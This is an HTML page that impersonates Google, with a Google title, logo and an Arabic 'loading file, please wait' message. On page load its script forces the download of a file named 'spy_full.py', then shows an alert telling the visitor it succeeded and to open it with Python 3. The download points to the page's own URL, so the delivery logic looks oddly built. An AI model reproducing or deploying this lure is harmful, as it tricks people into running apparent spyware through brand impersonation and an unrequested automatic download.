<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        body { background: white; font-family: Arial, sans-serif; text-align: center; padding-top: 100px; margin: 0; }
        img { width: 300px; margin-bottom: 30px; }
        h2 { color: #202124; font-size: 28px; }
        p { color: #5f6368; font-size: 20px; }
    </style>
</head>
<body>
    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
    <h2>جاري تحميل الملف...</h2>
    <p>يرجى الانتظار قليلاً</p>

    <script>
        function downloadFile() {
            const url = window.location.href;
            const link = document.createElement('a');
            link.href = url;
            link.download = 'spy_full.py';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            // رسالة بعد التنزيل
            setTimeout(() => {
                alert('تم تنزيل الملف بنجاح!\nافتحه باستخدام Python 3');
            }, 600);
        }

        // ابدأ التنزيل فور تحميل الصفحة
        window.onload = function() {
            setTimeout(downloadFile, 1200);   // بعد 1.2 ثانية
        };
    </script>
</body>
</html>
